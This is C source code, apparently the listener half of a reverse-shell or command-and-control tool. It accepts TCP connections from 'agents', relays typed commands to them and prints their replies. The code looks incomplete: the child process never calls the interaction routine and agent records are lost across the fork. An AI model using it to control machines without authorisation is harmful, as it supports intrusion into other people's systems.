#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#include "resh.h"
#include "srv.h"

int
setupsock(int p)
{
	int lfd;
	struct sockaddr_in adr;

	memset(&adr, 0, sizeof(adr)); /* zero out struct */

	adr.sin_family = AF_INET; /* IPv4 */
	adr.sin_addr.s_addr = htonl(INADDR_ANY); /* 0.0.0.0 */
	adr.sin_port = htons(p); /* port */

	if ((lfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) /* IPv4, TCP, Default based on request */
		die("Failed to create socket\n");
	if (bind(lfd, (struct sockaddr*) &adr, sizeof(adr)) < 0)
		die("Failed to bind\n");
	if (listen(lfd, 3) < 0)
		die("Failed to listen\n");
	return lfd;
}

void
interact(int fd, Agents *n)
{
	int clr; /* client recieved */
	char sbuf[2048], rbuf[8192];

	while ((clr = recv(fd, rbuf, sizeof(rbuf), 0)) > 0) {
		if (!(fgets(sbuf, sizeof(sbuf), stdin)))
			die("Failed to read command\n");
		if ((send(fd, sbuf, strlen(sbuf), 0)) < 0)
			die("Failed to send data\n");
		rtrim(rbuf);
		printf("%.*s", (int) strlen(rbuf), rbuf);
	}
	n->alive = 0;
	die("Connection closed: %s\n", n->ip);
}

void
listener(unsigned p0, unsigned p1, Agents *pa)
{
	int fd0, fd1, i = 0;
	pid_t pid;
	fd0 = setupsock(p0);
	fd1 = setupsock(p1);
	printf("Now listening on port %d & %d\n", p0, p1);

	while(1) {
		int sfd; /* session fd */
		size_t inc_adr_len;
		struct sockaddr_in inc_adr; /* incomming */

		memset(&inc_adr, 0, sizeof(inc_adr));
		inc_adr_len = sizeof(inc_adr);

		if ((sfd = accept(fd0, (struct sockaddr*) &inc_adr, (socklen_t*) &inc_adr_len)) < 0)
			die("Failed to accept connection\n");
		printf("Connection from: %s\n", inet_ntoa(inc_adr.sin_addr));
		if ((pid = fork()) < 0)
			die("Failed to create child process\n");
		else if (!pid) { /* Child */
			close(fd0); /* If child, kill the server fp and handle shell recieved */
			close(fd1);
			 /* setup struct for agent */
			pa->fp = sfd;
			pa->ip = inet_ntoa(inc_adr.sin_addr);
			pa->index = i;
			pa->alive = 1;
			pa++;
		} else { /* Parent */
			i++; /* Next agent gets next index */
			close(sfd); /* server doesn't need child fd */
		}
	}
}
